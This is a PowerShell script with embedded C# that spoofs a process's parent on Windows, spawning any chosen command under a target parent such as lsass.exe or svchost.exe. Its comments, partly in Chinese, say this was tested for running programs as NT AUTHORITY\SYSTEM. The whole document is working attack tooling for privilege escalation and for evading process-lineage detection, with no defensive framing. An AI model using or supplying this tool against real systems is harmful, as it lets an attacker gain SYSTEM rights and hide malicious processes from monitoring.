#Simple powershell/C# to spawn a process under a different parent process 
# usage:
# [MyProcess]::CreateProcessFromParent(parent_pid,command_to_execute, optional_comand_line_argument)
# 参数：
# parent_pid : pid of parent process
# command_to_execute : the fullpath of the application,即使路径包含空格，也不要在路径两边加双引号""
# optional_comand_line_argument : argument list for 'command_to_execute';它可以有三种形式：
#      1. 空格 参数列表
#      2. appname.exe 参数列表
#      3. "application完整路径" 参数列表
# NOTE: 不是所有的NT AUTHORITY\SYSTEM程序都能做父进程，测试后发现只有lsass.exe和svchost.exe
$mycode = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

public class MyProcess
{
    [DllImport("kernel32.dll")]
    static extern uint GetLastError();
    
	[DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(
        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

	public static void CreateProcessFromParent(int ppid, string command, string cmdargs)
    {
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_NEW_CONSOLE = 0x00000010;
		const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
		

        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        STARTUPINFOEX si = new STARTUPINFOEX();
        si.StartupInfo.cb = Marshal.SizeOf(si);
        IntPtr lpValue = IntPtr.Zero;
        Process.EnterDebugMode();
        try
        {
            
            IntPtr lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref lpSize);
            IntPtr phandle = Process.GetProcessById(ppid).Handle;
            Console.WriteLine("[+] Got Handle for ppid: {0}", ppid); 
            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, phandle);
            
            UpdateProcThreadAttribute(
                si.lpAttributeList,
                0,
                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);
            
            Console.WriteLine("[+] Updated proc attribute list"); 
            SECURITY_ATTRIBUTES pattr = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tattr = new SECURITY_ATTRIBUTES();
            pattr.nLength = Marshal.SizeOf(pattr);
            tattr.nLength = Marshal.SizeOf(tattr);
            Console.Write("[+] Starting " + command  + "...");
			bool b= CreateProcess(command, cmdargs, ref pattr, ref tattr, false,EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);
			Console.WriteLine(b+ " - pid: " + pi.dwProcessId+ " - Last error: "  +GetLastError() );
			
        }
        finally
        {
            
            if (si.lpAttributeList != IntPtr.Zero)
            {
                DeleteProcThreadAttributeList(si.lpAttributeList);
                Marshal.FreeHGlobal(si.lpAttributeList);
            }
            Marshal.FreeHGlobal(lpValue);
            
            if (pi.hProcess != IntPtr.Zero)
            {
                CloseHandle(pi.hProcess);
            }
            if (pi.hThread != IntPtr.Zero)
            {
                CloseHandle(pi.hThread);
            }
        }
    }

}
"@
Add-Type -TypeDefinition $mycode

#Autoinvoke?
# $cmdargs = ""
# if ($args.Length -eq 3) {
#     $cmdargs = $args[1] + " " + $args[2]
# }

#[MyProcess]::CreateProcessFromParent($args[0],$args[1],$cmdargs)
$parentProcess = $args[0]
$cmdFullPath = $args[1]
$cmdArgs = $args[2]
if ([string]::IsNullOrEmpty($cmdFullPath)) {
    $cmdFullPath = $null
}
if ([string]::IsNullOrEmpty($cmdArgs)) {
    $cmdArgs = $null
}
$procP = @(Get-Process -Name $parentProcess)
if ($null -ne $procP) {
    [MyProcess]::CreateProcessFromParent($procP[0].Id, $cmdFullPath, $cmdArgs)
    $procP | ForEach-Object {
        $_.Dispose()
    }
}